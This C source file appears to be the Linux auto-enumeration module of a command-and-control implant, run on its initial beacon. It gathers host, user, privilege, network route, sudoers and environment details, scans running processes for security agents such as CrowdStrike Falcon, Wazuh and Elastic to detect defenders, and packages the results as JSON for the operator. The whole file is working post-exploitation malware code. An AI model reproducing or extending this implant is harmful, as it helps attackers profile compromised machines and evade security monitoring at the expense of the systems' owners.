/**
 * auto_enum.c - Automatic enumeration on initial beacon (Linux)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <dirent.h>
#include <pwd.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include "../../include/postex.h"

typedef struct {
    char hostname[256];
    char os_version[128];
    char arch[16];
    char domain[256];
    char username[256];
    int is_admin;
    int is_system;
    int pid;
    int ppid;
    char integrity[32];
    char av_products[1024];
    char interfaces[2048];
    char routes[1024];
    int process_count;
    char local_admins[2048];
} AUTO_ENUM_RESULT;

static char *g_pending_enum = NULL;

typedef struct {
    const char *process_name;
    const char *product_name;
} AV_SIGNATURE;

static const AV_SIGNATURE av_signatures[] = {
    {"falcon-sensor", "CrowdStrike Falcon"},
    {"falcond", "CrowdStrike Falcon"},
    {"csfalconservice", "CrowdStrike Falcon"},
    {"wazuh-agent", "Wazuh"},
    {"ossec-agent", "OSSEC"},
    {"ossec-syscheckd", "OSSEC"},
    {"elastic-agent", "Elastic Agent"},
    {"filebeat", "Elastic Filebeat"},
    {"auditbeat", "Elastic Auditbeat"},
    {NULL, NULL}
};

static void json_escape_str(const char *src, char *dst, size_t dst_size) {
    size_t j = 0;
    if (!src || !dst || dst_size <= 0) return;
    for (size_t i = 0; src[i] && j < dst_size - 2; i++) {
        char c = src[i];
        if (c == '"' || c == '\\') {
            if (j + 2 >= dst_size) break;
            dst[j++] = '\\';
            dst[j++] = c;
        } else if (c == '\n' || c == '\r' || c == '\t') {
            if (j + 2 >= dst_size) break;
            dst[j++] = ' ';
        } else {
            dst[j++] = c;
        }
    }
    dst[j] = '\0';
}

int auto_enum_integrity(char *out, int max_out) {
    if (!out || max_out <= 0) return -1;
    if (geteuid() == 0) {
        snprintf(out, (size_t)max_out, "root");
    } else {
        snprintf(out, (size_t)max_out, "user");
    }
    return 0;
}

int auto_enum_detect_av(char *out, int max_out) {
    if (!out || max_out <= 0) return -1;
    out[0] = '\0';

    DIR *d = opendir("/proc");
    if (!d) return -1;

    struct dirent *ent;
    int offset = 0;
    int found = 0;

    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] < '0' || ent->d_name[0] > '9') continue;

        char cmdpath[64];
        snprintf(cmdpath, sizeof(cmdpath), "/proc/%s/comm", ent->d_name);
        FILE *f = fopen(cmdpath, "r");
        if (!f) continue;

        char comm[128] = {0};
        if (!fgets(comm, sizeof(comm), f)) {
            fclose(f);
            continue;
        }
        fclose(f);

        char *nl = strchr(comm, '\n');
        if (nl) *nl = '\0';

        for (int i = 0; av_signatures[i].process_name; i++) {
            if (strstr(comm, av_signatures[i].process_name) != NULL) {
                if (found > 0 && offset < max_out - 2) {
                    int s = snprintf(out + offset, (size_t)(max_out - offset), "; ");
                    if (s > 0 && offset + s < max_out) offset += s;
                }
                int pn = snprintf(out + offset, (size_t)(max_out - offset), "%s",
                    av_signatures[i].product_name);
                if (pn > 0 && offset + pn < max_out) offset += pn;
                found++;
                break;
            }
        }
    }
    closedir(d);

    if (found == 0)
        snprintf(out, (size_t)max_out, "None detected");
    return found;
}

static void collect_system_info(AUTO_ENUM_RESULT *r) {
    gethostname(r->hostname, sizeof(r->hostname) - 1);

    struct passwd *pw = getpwuid(getuid());
    if (pw && pw->pw_name)
        snprintf(r->username, sizeof(r->username), "%s", pw->pw_name);

    const char *domain = getenv("USERDOMAIN");
    if (domain)
        snprintf(r->domain, sizeof(r->domain), "%s", domain);

    r->pid = (int)getpid();
    r->ppid = (int)getppid();
    r->is_admin = (geteuid() == 0) ? 1 : 0;
    r->is_system = (r->is_admin && getuid() == 0) ? 1 : 0;

    struct utsname uts;
    if (uname(&uts) == 0) {
        snprintf(r->os_version, sizeof(r->os_version), "%s %s %s",
            uts.sysname, uts.release, uts.version);
        snprintf(r->arch, sizeof(r->arch), "%s", uts.machine);
    }

    auto_enum_integrity(r->integrity, (int)sizeof(r->integrity));
    auto_enum_detect_av(r->av_products, (int)sizeof(r->av_products));

    DIR *proc = opendir("/proc");
    if (proc) {
        struct dirent *ent;
        while ((ent = readdir(proc)) != NULL) {
            if (ent->d_name[0] >= '0' && ent->d_name[0] <= '9')
                r->process_count++;
        }
        closedir(proc);
    }
}

static void collect_interfaces(AUTO_ENUM_RESULT *r) {
    struct ifaddrs *ifap = NULL, *ifa;
    int offset = 0;

    if (getifaddrs(&ifap) != 0) return;
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *sin = (struct sockaddr_in *)ifa->ifa_addr;
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &sin->sin_addr, ip, sizeof(ip));
            int n = snprintf(r->interfaces + offset, sizeof(r->interfaces) - offset,
                "%s=%s; ", ifa->ifa_name, ip);
            if (n > 0 && offset + n < (int)sizeof(r->interfaces)) offset += n; else break;
        }
    }
    freeifaddrs(ifap);
}

static void collect_routes(AUTO_ENUM_RESULT *r) {
    FILE *f = fopen("/proc/net/route", "r");
    if (!f) return;

    char line[256];
    int offset = 0;
    fgets(line, sizeof(line), f); /* header */

    while (fgets(line, sizeof(line), f) && offset < (int)sizeof(r->routes) - 96) {
        char iface[32];
        unsigned long dest, gw, mask;
        if (sscanf(line, "%31s %lx %lx %*x %*x %*x %*x %lx",
                   iface, &dest, &gw, &mask) >= 4) {
            struct in_addr da, ga;
            da.s_addr = htonl((uint32_t)dest);
            ga.s_addr = htonl((uint32_t)gw);
            int n = snprintf(r->routes + offset, sizeof(r->routes) - offset,
                "%s dest=%s gw=%s; ", iface, inet_ntoa(da), inet_ntoa(ga));
            if (n > 0 && offset + n < (int)sizeof(r->routes)) offset += n; else break;
        }
    }
    fclose(f);
}

static void collect_local_admins(AUTO_ENUM_RESULT *r) {
    FILE *f = fopen("/etc/sudoers", "r");
    if (!f) {
        snprintf(r->local_admins, sizeof(r->local_admins), "root");
        return;
    }

    char line[512];
    int offset = 0;
    while (fgets(line, sizeof(line), f) && offset < (int)sizeof(r->local_admins) - 128) {
        if (line[0] == '#' || line[0] == '\n') continue;
        if (strstr(line, "ALL=") || strstr(line, "ALL ")) {
            char user[64] = {0};
            if (sscanf(line, "%63s", user) == 1) {
                if (offset > 0)
                    offset += snprintf(r->local_admins + offset,
                        sizeof(r->local_admins) - offset, ", ");
                offset += snprintf(r->local_admins + offset,
                    sizeof(r->local_admins) - offset, "%s", user);
            }
        }
    }
    fclose(f);
    if (r->local_admins[0] == '\0')
        snprintf(r->local_admins, sizeof(r->local_admins), "root");
}

static void collect_recent_files(char *out, size_t max_out) {
    const char *paths[] = {
        "/var/log/auth.log", "/var/log/secure", "/tmp", NULL
    };
    size_t offset = 0;
    for (int i = 0; paths[i] && offset < max_out - 64; i++) {
        if (access(paths[i], R_OK) == 0) {
            if (offset > 0) offset += snprintf(out + offset, max_out - offset, "; ");
            offset += snprintf(out + offset, max_out - offset, "%s", paths[i]);
        }
    }
}

static void collect_env_interest(char *out, size_t max_out) {
    static const char *vars[] = {
        "HOSTNAME", "USER", "LOGNAME", "SHELL", "PATH", "SSH_CONNECTION", NULL
    };
    size_t offset = 0;
    for (int i = 0; vars[i] && offset < max_out - 128; i++) {
        const char *val = getenv(vars[i]);
        if (val) {
            if (offset > 0) offset += snprintf(out + offset, max_out - offset, "; ");
            offset += snprintf(out + offset, max_out - offset, "%s=%s", vars[i], val);
        }
    }
}

static char *build_enum_json(const AUTO_ENUM_RESULT *r, const char *recent,
                             const char *env_interest) {
    char eh[512], eu[256], ed[256], ea[128], ev[512], ei[32], eav[1024];
    char eif[2048], ert[1024], ela[2048], erf[512], een[1024];

    json_escape_str(r->hostname, eh, sizeof(eh));
    json_escape_str(r->username, eu, sizeof(eu));
    json_escape_str(r->domain, ed, sizeof(ed));
    json_escape_str(r->arch, ea, sizeof(ea));
    json_escape_str(r->os_version, ev, sizeof(ev));
    json_escape_str(r->integrity, ei, sizeof(ei));
    json_escape_str(r->av_products, eav, sizeof(eav));
    json_escape_str(r->interfaces, eif, sizeof(eif));
    json_escape_str(r->routes, ert, sizeof(ert));
    json_escape_str(r->local_admins, ela, sizeof(ela));
    json_escape_str(recent, erf, sizeof(erf));
    json_escape_str(env_interest, een, sizeof(een));

    size_t cap = 16384;
    char *json = (char *)malloc(cap);
    if (!json) return NULL;
    memset(json, 0, cap);

    snprintf(json, cap,
        "{"
        "\"hostname\":\"%s\","
        "\"os_version\":\"%s\","
        "\"arch\":\"%s\","
        "\"domain\":\"%s\","
        "\"username\":\"%s\","
        "\"is_admin\":%s,"
        "\"is_system\":%s,"
        "\"pid\":%d,"
        "\"ppid\":%d,"
        "\"integrity\":\"%s\","
        "\"av_products\":\"%s\","
        "\"interfaces\":\"%s\","
        "\"routes\":\"%s\","
        "\"process_count\":%d,"
        "\"local_admins\":\"%s\","
        "\"recent_files\":\"%s\","
        "\"env_interest\":\"%s\""
        "}",
        eh, ev, ea, ed, eu,
        r->is_admin ? "true" : "false",
        r->is_system ? "true" : "false",
        r->pid, r->ppid, ei, eav, eif, ert,
        r->process_count, ela, erf, een);

    return json;
}

char *auto_enum_run(void) {
    if (g_pending_enum) {
        free(g_pending_enum);
        g_pending_enum = NULL;
    }

    AUTO_ENUM_RESULT result;
    memset(&result, 0, sizeof(result));

    char recent_files[512] = {0};
    char env_interest[1024] = {0};

    collect_system_info(&result);
    collect_interfaces(&result);
    collect_routes(&result);
    collect_local_admins(&result);
    collect_recent_files(recent_files, sizeof(recent_files));
    collect_env_interest(env_interest, sizeof(env_interest));

    g_pending_enum = build_enum_json(&result, recent_files, env_interest);
    return g_pending_enum;
}

const char *auto_enum_peek(void) {
    return g_pending_enum;
}

void auto_enum_release(void) {
    if (g_pending_enum) {
        free(g_pending_enum);
        g_pending_enum = NULL;
    }
}
